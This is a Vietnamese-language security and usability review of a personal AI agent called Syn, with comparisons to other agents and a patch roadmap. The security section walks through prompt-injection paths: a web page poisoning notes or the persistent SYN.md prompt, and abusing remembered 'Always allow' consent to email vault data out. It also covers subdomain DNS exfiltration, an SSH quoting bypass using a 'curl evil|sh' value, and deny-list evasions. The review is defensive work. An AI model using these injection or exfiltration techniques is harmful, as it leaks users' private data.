# Rà soát Syn — so với các AI agent hiện nay (2026-10-13)

**Mục tiêu đem ra đo:** một AI agent cộng sự của người dùng — toàn năng, cực dễ cài đặt, dễ tuỳ chỉnh,
và **bảo mật đặt lên đầu**.

**Phạm vi:** mã nguồn hiện tại (commit `460ef04` cộng phần SSH chưa commit), đọc code chứ không dựa vào
tài liệu cũ. Năm mảng rà soát song song: bảo mật, cài đặt và trải nghiệm, tuỳ chỉnh, năng lực, và so sánh
với các agent khác qua nguồn công khai đến tháng 10/2026. Những phát hiện mức Cao tôi đã tự đọc lại code để
xác nhận; chỗ nào chưa kiểm chứng đều ghi rõ.

---

## 0. Kết luận ngắn

**Syn có kiến trúc an toàn tốt nhất trong nhóm agent cá nhân hiện nay, nhưng chưa đạt mục tiêu ở cả ba trục
còn lại, và kiến trúc an toàn đó còn ba lỗ thật.**

| Trục | Điểm (0–10) | Một câu |
| --- | --- | --- |
| Bảo mật | **7** | Thiết kế luồng dữ liệu đúng hướng (giống CaMeL/FIDES), hơn hẳn OpenClaw/Hermes; nhưng "rửa taint" qua ghi chú, sửa được prompt thường trực, và "Luôn cho phép" quá rộng là ba lỗ cần vá trước mọi thứ khác. |
| Dễ cài đặt | **6** | Dán một khoá là chạy, Syn tự dựng connector — tốt nhất nhóm tự chạy trên máy. Nhưng không có chỗ chỉ cách lấy khoá, Telegram 8 bước, máy thứ hai phải tự dò từng thứ, lỗi là hộp đỏ cụt. |
| Dễ tuỳ chỉnh | **7** | "Nói là Syn dựng" đã có cho skill, việc định kỳ, connector — mỗi thứ qua một thẻ duyệt. Thiếu một chỗ xem "Syn đang được tuỳ chỉnh những gì", và người dùng nâng cao gần như không có lối mở rộng. |
| Toàn năng | **4** | Rất mạnh với vault của người dùng; yếu với thế giới bên ngoài: không OAuth (Google/Microsoft), không email, trình duyệt chỉ đọc, không chạy được khi tắt app, không giọng nói. |

**Ba việc đáng làm nhất, theo thứ tự:**
1. Vá H1–H3 (§3) — một trang web đọc một lần hiện có thể thành cửa hậu lâu dài.
2. Gói "lần đầu và khi hỏng" (§4): chỉ cách lấy khoá, giữ khoá cũ khi dán sai, hộp lỗi có nút sửa, danh
   sách việc cần làm trên máy mới, gợi ý câu hỏi.
3. OAuth Google/Microsoft + email (bước 10) — mở ra phần lớn công việc thật của một người.

---

## 1. Đặt Syn cạnh các agent khác

Nguồn đầy đủ ở phụ lục A. Đánh dấu **[?]** là chưa xác nhận được từ nguồn chính.

| | **Syn** | Claude Code / Cowork | OpenAI Codex / ChatGPT Dots | OpenClaw | Hermes Agent | Manus | Gemini (Chrome) / M365 Copilot |
| --- | --- | --- | --- | --- | --- | --- | --- |
| **Phạm vi** | Vault cá nhân (ghi chú, việc, lịch, tài chính, bảng, feed), web đọc, connector tự dựng (REST, MCP, SSH, thiết bị) | Lập trình + việc máy tính; Cowork cho việc văn phòng | Lập trình; Dots là agent luôn chạy, có máy ảo riêng | Rất rộng: shell, trình duyệt, file trên máy | Rộng, tự viết skill, cron | Rộng, máy ảo đám mây | Web trong Chrome / M365 |
| **Cài cho người không kỹ thuật** | Dán một khoá API (hoặc cài Ollama) | Trung bình: terminal hoặc app, đăng nhập gói | Dễ (ChatGPT/Dots); Codex CLI cần terminal | Khó: terminal, Node, daemon, khoá | Khó: terminal, khoá, có thể cần VPS | Rất dễ: web, Telegram quét QR | Dễ, có sẵn |
| **Tuỳ chỉnh** | SYN.md, trí nhớ, skill/việc định kỳ/connector do Syn soạn và người duyệt | CLAUDE.md, skill, hook, subagent, plugin, MCP | App/plugin, connector, MCP, skill | Skill, plugin, chợ ClawHub | Skill tự viết, hub | Ít | Ít / Copilot Studio |
| **Mô hình bảo mật** | Taint theo luồng dữ liệu, cổng chính sách một bảng, thẻ duyệt, duyệt theo từng máy, giữ thay đổi sau khi đọc | Chế độ quyền, bộ phân loại auto, sandbox hệ điều hành | Máy ảo đám mây, Dots chỉ-đọc khi chạy nền, "auto-review" | Chạy thẳng trên máy chủ; ghép cặp DM | Duyệt lệnh bằng regex, container tuỳ chọn | Máy ảo cô lập | Dừng ở đăng nhập/thanh toán |
| **Sự cố đã biết** | Chưa có (chưa phát hành rộng) | Prompt injection qua comment code (2026) | ShadowLeak (2025) | Rất nhiều: CVE-2026-25253, 341–824 skill độc, ~500k máy lộ | 3 CVE; audit: 4 lỗi Critical | Chưa thấy | EchoLeak (2025) |
| **Chạy ở đâu** | Trên máy người dùng; nhà cung cấp AI tuỳ chọn, kể cả chạy tại máy | Máy / máy ảo đám mây | Đám mây | Máy / tự host | Máy / VPS | Đám mây (Meta) | Đám mây |
| **Di động / nhắn tin** | App Android; bot Telegram (chạy trên desktop) | App Claude; Channels (Telegram, Discord, iMessage) | App ChatGPT; Dots trong Slack/Teams | 20+ kênh, app gốc | Telegram, Discord, Slack, WhatsApp, Signal, email | Telegram | Chrome Android / Teams |

**Nhận xét:**
- Về **bảo mật**, Syn đi đúng hướng mà giới nghiên cứu đang khuyên: tách dữ liệu không tin cậy theo luồng
  (CaMeL, FIDES), giá trị nhạy cảm lấy từ người dùng chứ không từ nội dung đọc được (vai trò
  `recipient`/`amount`), không có chợ skill (ClawHavoc là bài học), connector là bản khai chứ không phải
  code. OpenClaw và Hermes là phản ví dụ rõ nhất về "toàn năng mà bỏ bảo mật".
- Về **dễ cài**, Syn dễ hơn hẳn các agent chạy trên máy (OpenClaw, Hermes, Claude Code), nhưng khó hơn các
  agent đám mây (Manus, ChatGPT), vì người dùng vẫn phải tự có khoá API và mỗi máy phải duyệt lại.
- Về **toàn năng**, khoảng cách lớn nhất là: hành động trên web (Dots, Manus, Gemini đều làm được), dịch vụ
  phổ biến qua OAuth (Gmail, Lịch, Drive, Outlook), chạy liên tục khi người dùng không mở app, và kênh nhắn
  tin ngoài Telegram.

---

## 2. Điểm mạnh thật sự (giữ nguyên, đừng phá)

- **Một bảng chính sách, mặc định đóng.** `syn/policy.rs:224-361`, mỗi tool đúng một dòng; test thất bại khi
  lệch. Tool không có dòng thì bị từ chối sau khi đọc nguồn ngoài.
- **Taint đặt ở chỗ mọi lời gọi phải đi qua** (`tools.rs` trong `execute_tool`), nên công thức (recipe)
  không lách được.
- **Thứ tự cổng chặt:** taint → bề mặt → chế độ kế hoạch → quyền. "Không bao giờ" thắng mọi đường; thao
  tác không thể hoàn tác chỉ đi qua kế hoạch; gửi sau khi đọc phải khớp đúng mã băm của yêu cầu đã duyệt.
- **Duyệt theo từng máy** cho MCP, connector khai báo, việc định kỳ, quyền — file đồng bộ không tự mở đường
  ra ngoài trên máy khác.
- **Khoá IPC của webview** (`app_shell/gate.rs`): khung trình duyệt chỉ gọi được đúng một lệnh. CSP
  `script-src 'self'`, Markdown của model qua DOMPurify.
- **Safe:** model chỉ thấy chỗ giữ chỗ (`{{safe:…}}`), từng mục có danh sách nơi được gửi tới, kết quả được
  lọc ở nhiều dạng mã hoá.
- **Telegram:** chỉ một người, một chat; mã ghép cặp 128 bit, dùng một lần, hết hạn sau 10 phút.
- **Rhai `compute`:** không file, không mạng, không `eval`, có trần thao tác.
- **SSH (mới):** ghim khoá máy chủ, thẻ xin phép hiện đúng dòng lệnh.
- **Trải nghiệm tốt:** dán một khoá là chạy; card kết nối chỉ hỏi điều người dùng biết, có "Lấy ở đâu?" và
  báo đúng ô sai; skill/việc định kỳ một chạm; thẻ giữ thay đổi có so sánh trước/sau; không bao giờ hiện nút
  sẽ không được tôn trọng.
- **Đo lường:** 79 bài eval chạy đúng đường sản phẩm thật, chấm tất định; an toàn là cổng cứng. Kết quả gần
  nhất trên gpt-6-luna: hoàn thành khoảng 0,91, an toàn khoảng 1,00.

---

## 3. Bảo mật — phát hiện

Mức độ: **Cao** = một lần đọc nội dung độc có thể gây rò dữ liệu hoặc hành động lâu dài.
✅ = tôi đã tự đọc code xác nhận. ☑️ = người rà soát xác nhận bằng đọc code, chưa chạy thử.

### Cao

**H1. "Rửa taint" qua ghi chú ✅**
Taint chỉ sống trong một run. Run đã đọc trang web vẫn được `create_node` (`policy.rs:279`, có
`.after_reading()`, cả Telegram và việc định kỳ), và ghi chú tạo ra **không mang dấu nguồn** — `from_outside`
(`taint.rs:318`) chỉ nhận `source`/`source_url`/`clipped_from` là URL. Vài ngày sau, một câu hỏi bình thường
đọc lại ghi chú đó trong một run **sạch**: lúc này `update_node`, `trash_node` chạy không bị giữ, và gửi qua
connector chạy theo quyền "Luôn cho phép" sẵn có (H3).
*Sửa:* mọi thứ một run đã taint tạo ra (`create_node`, `capture`, `draw_board`, `write_spreadsheet`) được đóng
dấu nguồn; `get_node`, `query_nodes` (đoạn trích) và RAG tôn trọng dấu đó.

**H2. Run sạch sửa được những thứ đi vào mọi prompt ✅**
`update_node` chỉ chặn ghi chú connector, và với skill chỉ chặn `author`, `trial_at`, bật skill chưa thử
(`tools.rs:4116-4135`). Vì vậy model sửa được **nội dung SYN.md**, nội dung một **skill đang bật**, và
`pinned`/nội dung của **trí nhớ** — không thẻ nào. Ghi vào vault thì không bao giờ hỏi. Kết hợp với H1: một
trang web → một ghi chú → một lần sửa SYN.md → mọi run sau, kể cả Telegram và việc định kỳ, đều mang lệnh
của kẻ tấn công.
Cùng họ: một skill đồng bộ từ máy khác với `enabled: true` và tác giả `user` có hiệu lực ngay, không cần
duyệt trên máy này (`skill.rs:240-246`, `may_be_enabled` ở dòng 309) — trong khi connector, MCP, việc định kỳ
đều phải duyệt theo máy.
*Sửa:* SYN.md, `syn_memory`, `syn_skill` là lớp "đi vào mọi prompt". Model sửa chúng thì luôn thành thay đổi
bị giữ (hoặc `pending_revision` với skill), kể cả khi run sạch; cấm `pinned`/`enabled` trong bản vá của model;
skill mới hoặc đã đổi phải duyệt trên từng máy.

**H3. "Luôn cho phép" một lệnh gửi là cho mọi đối số, kể cả sau lượt đọc nội dung lạ ✅**
Phạm vi là `net_write:<tên>:<tool>`, không ràng đối số, kéo dài 90 ngày (`consent.rs`). Tool MCP không bao giờ
bị coi là không thể hoàn tác và không có vai trò người nhận. `untrusted_before` chỉ hạ quyền `UseSecret`
(`gate.rs:417`), không hạ `NetWrite`. Kịch bản: người dùng từng bấm "Luôn cho phép" cho `send_email` của một
MCP Gmail; lượt 1 đọc trang độc, lời dặn sống lại trong tóm tắt của chính trợ lý; lượt 2 ("ừ làm đi") bắt đầu
sạch → `send_email(tới kẻ tấn công, nội dung vault)` chạy không thẻ, không kế hoạch.
*Sửa:* không đưa "Luôn cho phép" cho tool gửi có tham số tự do hoặc tham số kiểu người nhận (và không bao giờ
cho SSH); áp `untrusted_before` cho mọi `NetWrite` đã nhớ; mọi lệnh ghi qua MCP đi qua `propose_writes`.

**H4. `browse` rò dữ liệu qua tên miền con, không hỏi ✅**
`browse_carries_nothing` (`taint.rs:576-604`) chỉ đếm độ dài path + query + fragment; dưới 8 ký tự là "không
mang gì" → cho qua. Tên miền con không được đếm: `https://<dữ-liệu-mã-hoá>.evil.example/` có "room" bằng 0.
Trước khi run bị taint thì không có kiểm tra đích nào (`engine.rs:2570`, "the first page of a run goes wherever
it was asked to"), và chỉ riêng lần tra DNS đã đủ đưa dữ liệu ra. Việc định kỳ cũng được `browse`.
*Sửa:* đếm mọi nhãn tên miền ngoài tên miền đăng ký vào "room"; hỏi khi máy chủ chưa ai nêu tên và chưa từng
thấy; tra DNS sau khi cổng quyết định.

**H5. SSH: chỉ thoát ký tự theo POSIX — shell đăng nhập khác có thể biến giá trị thành lệnh ✅**
`quote` (`ssh.rs`) dùng `'…'\''…'`. Trong **fish**, `\'` là ký tự thoát ngay trong nháy đơn, nên giá trị
`\'; curl evil|sh #` đóng chuỗi rồi chạy lệnh. Trên Windows OpenSSH (cmd.exe), nháy đơn không có nghĩa. Lỗi
này do chính tôi đưa vào ở phần SSH hôm nay.
*Sửa:* sau khi kết nối, dò shell và chỉ nhận sh/bash/dash/zsh/ksh; hoặc chạy `exec /bin/sh -c` với dòng lệnh
truyền qua stdin; từ chối `\` và xuống dòng trong giá trị trừ khi thao tác cho phép.

### Trung bình

| # | Phát hiện | Nơi | Sửa |
| --- | --- | --- | --- |
| M1 ✅ | **Danh sách cấm của SSH lách được.** `env LANG=C {{prog}}` (từ `NAME=value` bị coi là chương trình), `find … -exec {{cmd}}`, placeholder trong từ tuỳ chọn (`tar --to-command={{x}}`, `rsync -e {{x}}`, `git -c {{kv}}`), chương trình chưa có trong danh sách (`sed` lệnh `e`, `sqlite3 .shell`, `psql -c`, `docker exec`), `python3.11`. | `ssh.rs` | Chuyển sang danh sách cho phép: chỉ điền vào vị trí bản khai đánh dấu là dữ liệu; cấm placeholder trong từ tuỳ chọn; khớp tiền tố trình thông dịch. |
| M2 ☑️ | **Kiểm tra người nhận và máy chủ là so chuỗi con**, và Syn tự tạo được "bằng chứng": ghi chú người tạo trong cùng run đã taint làm địa chỉ của kẻ tấn công thành "người dùng đã nói". `t.com` lọt khi người dùng nói `todoist.com`. | `writes.rs:223-231`, `authoring.rs:263` | So nguyên địa chỉ / ranh giới nhãn; bỏ qua ghi chú người do run taint tạo; cờ "người nhận lần đầu thấy". |
| M3 ☑️ | **Cài đặt đồng bộ đổi được nhà cung cấp AI** — `openai_base_url`, `provider` nằm trong `Syn/settings.json`. Máy khác hoặc dịch vụ đồng bộ đổi URL → máy này gửi khoá OpenAI và cả prompt có dữ liệu vault tới đó. | `models/syn.rs`, `provider/mod.rs:270` | Giữ provider/URL theo từng máy, hoặc gắn khoá với URL và hỏi lại khi đổi. |
| M4 ☑️ | **File run nằm trong thư mục đồng bộ và mang trạng thái quyền** (`Syn/runs/`): kế hoạch đã duyệt, kết quả tool đầy đủ (kể cả output SSH, khoá API dịch vụ trả về). Sửa file run ở máy khác thành `Approved` → gửi khi người dùng trả lời bất kỳ thẻ nào của run đó. | `run.rs:1337` | Trạng thái an ninh của run để trong `.synabit/` hoặc ký bằng khoá thiết bị; che giá trị dạng bí mật trong kết quả lưu. |
| M5 ☑️ | Chỗ giữ chỗ Safe điền được vào **mọi** đối số, không chỉ ô xác thực (vd dán token vào nội dung issue công khai). | `safe/egress.rs:142` | Bản khai đánh dấu tham số được mang bí mật. |
| M6 ☑️ | Quyền connector khoá theo **tên hiển thị**: connector mới tên "GitHub" trỏ tới máy khác thừa hưởng "Luôn đọc từ GitHub". | `declared.rs:124` | Khoá theo `manifest.id` + dấu vân tay máy chủ. |
| M7 ☑️ | Kênh lén sau khi đọc: ký tự đơn, ngày tháng, số ≤ 100 được coi là "chỉ nhắc lại"; liên kết trang đưa ra luôn được mở → rò vài bit mỗi lần `browse`. | `taint.rs` | Giới hạn số lần `browse` sau khi đọc; bỏ miễn trừ ký tự đơn/ngày khi giá trị không có trong câu hỏi. |
| M8 ✅ | **Máy B mời "Tiếp tục" việc máy A đang chạy:** `Syn/runs` đồng bộ, `is_live` chỉ biết tiến trình của máy mình → bấm là chạy hai lần. | `run.rs:1249` | Ghi thiết bị đang chạy vào run; máy khác chỉ hiện "đang chạy trên máy kia". |

### Thấp
- `capabilities/*.json` cấp `fs:allow-write-file`, `process:default` cho `windows: ["*"]` — thu về `["main"]`.
- MCP stdio dạng `npx pkg` không ghim phiên bản: dấu vân tay giữ nguyên trong khi code đổi.
- Trả lời Telegram đi qua máy chủ Telegram (không mã hoá đầu cuối); RAG mặc định có tài chính. Chưa có chỗ
  nào nói rõ loại dữ liệu nào đi đâu.
- Rhai chỉ có trần số thao tác, không có trần thời gian thực.
- DNS rebinding cho trình duyệt vẫn mở (đã ghi trong code).

---

## 4. Dễ cài đặt và trải nghiệm hằng ngày

### 4.1 Lần đầu
| Đường | Bước | Nhận xét |
| --- | --- | --- |
| Có khoá API | 1 ô, 1 chạm, 0 quyết định | Tốt nhất nhóm. Hãng và model tự chọn theo tiền tố khoá. |
| Không có khoá | Không có hướng dẫn nào | **Cao.** Card chỉ ghi "Của OpenAI, Anthropic hoặc Google", không link, không bước. |
| Ollama | 4–5 chạm + cài ngoài app + tải 3 GB | Chấp nhận được cho người muốn chạy tại máy. |

**Lỗi đã xác nhận ✅ (Cao):** dán một khoá gõ sai cho đúng hãng đang dùng sẽ **ghi đè khoá đang chạy tốt** —
`syn_connect_with_key` lưu trước rồi mới thử, và chỉ hoàn tác khi trước đó chưa có khoá
(`commands/syn.rs:406-421`).

Khác (Trung bình): mọi lỗi khi thử đều hiện là "Hãng không nhận khoá này", kể cả mất mạng; `best_model` chọn
model lớn nhất, có thể đắt nhất, không báo giá; khoá `sk-or-` (OpenRouter), DeepSeek bị gửi nhầm sang OpenAI;
màn trống không có câu gợi ý nào.

### 4.2 Khi làm việc
- Một việc điển hình "xem trang này, sửa ghi chú, gửi tóm tắt cho sếp" sinh **3–4 thẻ**. Mỗi thẻ đều có lý do,
  nhưng lời giải thích dài (khoảng 50 chữ mỗi thẻ).
- ✅ **(Cao)** Thẻ xin phép không có "Lần này thì không": chỉ có *Không bao giờ* / *Luôn cho phép* / *Cho việc
  này*, và *Không bao giờ* được lưu vĩnh viễn (`consent.rs`), gỡ được thì chỉ trong Hub → Quyền.
- Thẻ chọn (ChoiceCard) không có "Không cái nào"; thẻ kế hoạch gửi hiện tên tham số tiếng Anh.

### 4.3 Kết nối dịch vụ, Telegram, việc định kỳ
- Kết nối dịch vụ qua Syn: 1–2 ô, 1–2 chạm — **rất tốt**.
- MCP: biểu mẫu tay 9 ô, Syn không tự thêm được (đã giấu dưới "Nâng cao").
- **Telegram: khoảng 8 bước, phần lớn ngoài app** (BotFather), có một dòng hướng dẫn — **Cao** với người không
  kỹ thuật.
- Việc định kỳ và skill từ chat: 1 chạm — tốt. Card skill hiện bước Markdown thô với tên tool (`query_nodes`).

### 4.4 Máy thứ hai
Máy B phải: dán lại khoá AI, nhập lại bí mật từng connector, duyệt lại từng connector / MCP / việc định kỳ /
quyền, ghép lại Telegram, bật lại chế độ gia đình. Phần lớn là đúng thiết kế an toàn — nhưng **không có danh
sách "Còn N việc cần làm trên máy này"**; người dùng chỉ biết khi thứ đó hỏng. Connector đã nối ở máy A hiện
"Chưa kết nối" ở máy B mà không giải thích.

### 4.5 Khi hỏng
- **Cao:** mọi lỗi gửi rơi vào **một hộp đỏ không có nút** (không Thử lại, không Mở cài đặt, không Đổi model),
  chữ tiếng Anh thô của nhà cung cấp, đôi khi kèm JSON. Run hỏng giữa chừng vì khoá bị thu hồi thì **không tiếp
  tục được**, phải hỏi lại từ đầu.
- Đang thử lại khi bị giới hạn tốc độ: không có chỉ báo.
- Lái giữa chừng: không có dấu hiệu "Syn sẽ đọc tin này ở bước tới"; tin không được nhận thì bong bóng biến mất.
- Hết lượt (carry on): xử lý tốt.

### 4.6 Điện thoại
Đã báo rõ: Ollama, bot Telegram, MCP stdio chỉ có trên desktop. **Chưa báo:** `folder.watch` vẫn hiện nút "Chọn
thư mục" trên điện thoại rồi hỏng khi chạy; tìm web không chạy trên điện thoại nhưng người dùng không được báo
trước; thẻ thông báo Android hiện trên desktop và bấm không có tác dụng.

### 4.7 Ngôn ngữ
Quét 900 chuỗi tiếng Việt: thuật ngữ tiếng Anh lọt vào rất nhiều (token 24, model 23, thread 15, tool 15,
connector 12, prompt 10, keychain 8…), "khoá"/"khóa" lẫn lộn, "API key"/"khoá"/"khoá truy cập" cho cùng một
thứ, vài câu dịch sát chữ ("cưỡi trong mọi prompt"). Vài chuỗi đã cũ: `connections_none` nhắc thư viện đã xoá,
`instructions_moved` chỉ tới chỗ không còn, `routine_proposal_may` mâu thuẫn ("không gửi gì" bên cạnh "gửi về
điện thoại").

Bảng thuật ngữ đề xuất: model → *bộ não AI*, provider → *hãng AI*, API key → *mã khoá*, keychain → *kho mật
khẩu của máy*, thread → *việc dài ngày*, connector → *dịch vụ kết nối*, tool → *khả năng*, note → *ghi chú*.

---

## 5. Tuỳ chỉnh

| Thứ | Nói với Syn | Giao diện | Duyệt | Đồng bộ | Lịch sử |
| --- | --- | --- | --- | --- | --- |
| Chỉ dẫn (SYN.md) | Sửa được qua `update_node` — **không thẻ** (H2) | Tab "Cách làm việc với bạn" | Không | Có | Có |
| Trí nhớ | `remember`; tự đề xuất sau mỗi run (hàng chờ duyệt) | Tab trí nhớ: ghim, xác nhận, quên | Đề xuất: có | Có | Có |
| Skill | `skill_draft` (tắt sẵn) | Tab skill: sửa, bật/tắt, thử | Thẻ một chạm | Có — **nhưng bật luôn trên mọi máy** (H2) | Chỉ số phiên bản |
| Việc định kỳ | `routine_draft` (tắt sẵn) | RoutinesPanel | Theo từng máy | Có | Chưa có |
| Connector | `connector_draft` | Card kết nối | Theo từng máy | Bản khai: có; bí mật: không | Có (ghi chú) |
| MCP | Không | Biểu mẫu tay | Theo từng máy | Có | — |
| Quyền | — | Tab Quyền: xem, gỡ | — | Không (theo máy) | — |
| Model | — | Cài đặt | — | Có (M3) | — |

**Thiếu:**
- Không có một chỗ xem "Syn đang được tuỳ chỉnh những gì" (rải ở 4 tab Hub + Cài đặt + Telegram + MCP).
- Không phát hiện mâu thuẫn giữa SYN.md, trí nhớ kiểu `instruction` và skill; không có thứ tự ưu tiên ghi rõ.
- Skill quá ngân sách mục lục bị bỏ âm thầm; theo chính đo đạc trong code, skill được nạp ở 0/17 run
  (`toolset.rs:17-20`) — chủ yếu nhờ khớp từ khoá dự phòng.
- **Người dùng nâng cao:** không plugin, không hook, không định nghĩa subagent, không lệnh tắt, tầng skill `code`
  chưa làm, bộ đếm `needs_logic` (điều kiện mở tầng script) không thấy được lưu ở đâu.
- Không có model theo từng việc (việc định kỳ, subagent dùng chung model mặc định); không có trần chi phí tiền.

So với nhóm khác: Claude Code sâu hơn nhiều (hook, subagent, plugin) nhưng dành cho người kỹ thuật; Hermes tự
viết skill **không cần duyệt** — chính audit của nó gọi đó là kho prompt injection lâu dài; Syn soạn và bắt duyệt
là đúng, chỉ còn lỗ H2.

---

## 6. Toàn năng — còn thiếu gì

Syn có **56 tool cài sẵn** cộng tool connector sinh lúc chạy. Rất mạnh trong vault: ghi chú, việc, lịch, người,
tài chính (kể cả dàn giao dịch từ sao kê), bảng trắng, feed, file đã nhập, bảng tính, `crunch`/`compute` cho
số liệu, lịch sử và khôi phục. Vòng chạy tốt: song song cho `browse`/`delegate`, nén ngữ cảnh, cache prompt, lái
giữa chừng, tiếp tục khi hết lượt, subagent chỉ-đọc.

| Thiếu | Ảnh hưởng | Các agent khác |
| --- | --- | --- |
| **OAuth** (Google, Microsoft) | Gmail, Lịch Google, Drive/Sheets, Outlook gần như ngoài tầm | Có ở ChatGPT, Gemini, Copilot, Claude |
| **Email** (IMAP/SMTP) | Không đọc/gửi thư được trừ qua connector tự dựng | Hermes, OpenClaw, ChatGPT |
| **Trình duyệt hành động** | Chỉ đọc; không bấm, không điền form, không đăng nhập | Dots, Manus, Gemini, Codex |
| **Chạy khi tắt app** | Việc định kỳ chỉ chạy khi app mở; bỏ lỡ quá 12 giờ thì bỏ qua | Dots, Manus (đám mây); OpenClaw/Hermes (daemon) |
| **Lịch chạy** | Chỉ "HH:MM + thứ"; không mỗi giờ, mỗi tháng, theo sự kiện ngoài | cron ở Hermes/OpenClaw |
| **Giọng nói** | Không nghe, không nói; ghi âm Telegram không hiểu được | Phổ biến |
| **Tạo ảnh, gửi ảnh** | Không | ChatGPT, Gemini |
| **Shell / chạy code trên máy** | Không (có chủ đích); chỉ Rhai không I/O, SSH lệnh cố định | Claude Code, Codex, OpenClaw |
| **Tạo hàng loạt** | `hd-thirty-tasks-en` vẫn vượt 12 vòng vì không có tạo theo lô | — |
| **Kênh nhắn tin** | Chỉ Telegram, và chỉ khi desktop đang chạy | OpenClaw 20+ kênh |
| **iOS** | Chưa có | Phổ biến |

**Nhận định:** "toàn năng" cho một người không cần shell trên máy (đó là chỗ OpenClaw trả giá đắt). Cần **OAuth,
email, trình duyệt hành động có kiểm soát, và một cách chạy khi app tắt** — bốn thứ đó phủ phần lớn việc thật.

---

## 7. Chất lượng và độ tin cậy

- **Test:** khoảng 3.300 test Rust (1.279 trong `syn/`), 276 file test giao diện — đều qua ở lần chạy gần nhất.
- **Eval:** 79 bài (MultiStep 16, Connectors 12, VaultQa 10, Safety 10, Finance 9, Feeds 6, Web 6, Board 5,
  Memory 5; 15 bài khó). Kết quả gần nhất trên gpt-6-luna: hoàn thành ~0,91, an toàn ~1,00; yếu nhất là **trí
  nhớ (0,40–0,60)** và việc nhiều vòng. Còn trượt: `hd-thirty-tasks-en`, `mem-correction-en`, `mem-earlier-vi`,
  `hd-supersede-en`, `sf-delete-kind-en`. **Chưa có lần chạy đủ 79 bài kể từ các bước 1–9 và SSH.**
- **Chỉ đo trên một model.** Chưa biết Syn chạy ra sao trên Claude/Gemini, và model chạy tại máy thì yếu rõ
  (gemma4:e2b dừng giữa chừng 63/186 lần).
- **Chưa chạy trên app thật** cho các bước 1–9 và SSH — mới kiểm bằng test và bản xem trước có giả lập Tauri.
- **Tài liệu trong code đã cũ:** `routine.rs:7-11` vẫn nói "Syn never creates… a routine"; `calibration.rs` nói
  "Not wired yet"; `skill.rs:139` nhắc "P4"; tài liệu thiết kế ghi 76 bài eval.

---

## 8. Lộ trình đề xuất

### P0 — Vá bảo mật (trước khi thêm năng lực nào)
1. Dấu nguồn cho mọi thứ run đã taint tạo ra (H1).
2. Lớp "đi vào mọi prompt": SYN.md, trí nhớ, skill — model sửa thì thành thay đổi bị giữ; skill duyệt theo
   từng máy (H2).
3. Bỏ "Luôn cho phép" cho lệnh gửi có tham số tự do và cho SSH; `untrusted_before` cho mọi `NetWrite`; MCP ghi
   qua kế hoạch (H3).
4. Đếm tên miền con vào "room" của `browse`; tra DNS sau cổng (H4).
5. SSH: dò shell, chuyển sang danh sách cho phép (H5, M1).
6. Provider/URL và trạng thái an ninh của run theo từng máy (M3, M4); "đang chạy ở máy khác" (M8).

**Đã làm (2026-10-13), mỗi mục có test:**

| Mục | Thay đổi | Nơi |
| --- | --- | --- |
| H1 | Ghi chú/bảng trắng do run đã taint tạo ra mang `written_after_reading: [nguồn]`; đọc lại bằng `get_node`, liệt kê bằng `query_nodes`/`get_linked_nodes`/`recall`/`look_back`/`timeline`, hay qua RAG đều taint lại từ đúng nguồn đó. QuickCap không đóng dấu vì người dùng tự lưu bản nháp. | `taint.rs` (`WRITTEN_AFTER_READING`, `note_stamp`), `tools.rs` (`write_tool_node`, `stamp_board`, `LISTS_NOTES`) |
| H2 | Model sửa/xoá/khôi phục SYN.md, trí nhớ, skill → luôn thành thay đổi chờ duyệt trong app, kể cả run sạch; bị từ chối ở Telegram, việc định kỳ, run phụ, và trong bước của recipe. Skill phải được cho phép **trên từng máy** theo dấu vân tay nội dung; skill đổi ở máy khác hiện "Dùng trên máy này". Skill đang bật lúc nâng cấp được giữ nguyên. | `gate.rs` (`rides_prompt`), `tools.rs` (`rides_prompt`, `as_approved`), `skill.rs` (`all_here`, `approve_here`), `approvals.rs` (`skills`), `RunInspector.vue` |
| H3 | "Luôn cho phép" một lệnh gửi chỉ được nhớ khi mọi tham số là công tắc hoặc danh sách cố định; MCP và SSH không bao giờ. "Luôn cho phép" cũ không còn hiệu lực cho các lệnh đó; sau một lượt đã đọc nội dung lạ, cả "Luôn" lẫn "Cho việc này" đều bị hỏi lại. | `declared.rs` (`write_may_be_remembered`), `gate.rs`, `commands/syn.rs` |
| H4 | Tên miền con tính vào "room" của `browse`. | `taint.rs` (`registrable`) |
| H5 | SSH chạy `/bin/sh -s` và đưa dòng lệnh qua stdin — shell đăng nhập (fish, cmd.exe…) không còn đọc dòng lệnh. Có test chạy qua `/bin/sh` thật với các giá trị độc. | `ssh.rs` (`SHELL`) |
| M1 | Cấm giá trị trong từ tuỳ chọn (`--x={{v}}`), `find -exec`, `NAME=value` sau `env`/`sudo`, trình thông dịch có số phiên bản; thêm `sed`, `sqlite3`, `psql`, `docker`, `git`, `vim`… vào danh sách. | `ssh.rs` (`command_problems`) |
| M3 | Hãng AI và địa chỉ (OpenAI, Ollama) lấy từ bản ghi riêng của máy; file cài đặt đồng bộ không đổi được nơi máy này gửi khoá và prompt. | `settings.rs` (`SendsTo`), `approvals.rs` (`provider`) |
| M4 | Trạng thái quyền của run (lệnh gửi đã duyệt, đã đọc nội dung ngoài) lưu thêm ở `.synabit/runs/`; file run đồng bộ chỉ được tin trong phạm vi bản sao này đồng ý. | `run.rs` (`Guarded`, `guard`) |
| M8 | "Tiếp tục" việc bị cắt chỉ hiện trên máy đã chạy việc đó. | `run.rs` (`started_here`, `continuable`) |

**Còn lại từ danh sách bảo mật:** M2 (so người nhận/máy chủ theo chuỗi con), M5 (chỗ giữ chỗ Safe trong mọi tham số), M6 (quyền theo tên hiển thị), M7 (kênh lén nhỏ sau khi đọc), mọi lệnh ghi MCP qua `propose_writes`, DNS của điều hướng do trang kích hoạt, mục Thấp.

### P1 — Dễ cài, dễ sống cùng
1. Giữ khoá cũ khi dán khoá sai; tách "không tới được" khỏi "khoá bị từ chối"; nhận diện OpenRouter.
2. "Lấy mã khoá ở đâu?" cho 3 hãng, gợi ý gói miễn phí của Gemini trước.
3. Hộp lỗi có nút: Thử lại / Mở cài đặt / Đổi model; run hỏng vì khoá thì tiếp tục được.
4. Thẻ xin phép thêm "Lần này thì không", xác nhận khi bấm "Không bao giờ"; rút lời giải thích còn một dòng.
5. Danh sách "Còn N việc cần làm trên máy này" cho máy mới.
6. 6–8 câu gợi ý tiếng Việt ở màn trống, và một trang "Syn làm được gì".
7. Telegram có hướng dẫn từng bước và link thẳng tới BotFather.
8. Áp bảng thuật ngữ, sửa các chuỗi cũ; báo trước tính năng không có trên điện thoại.
9. Một màn "Syn đang được tuỳ chỉnh những gì", có cảnh báo mâu thuẫn.

### P2 — Toàn năng
1. **OAuth Google/Microsoft** (bước 10) + **email** — phần lớn việc thật nằm ở đây.
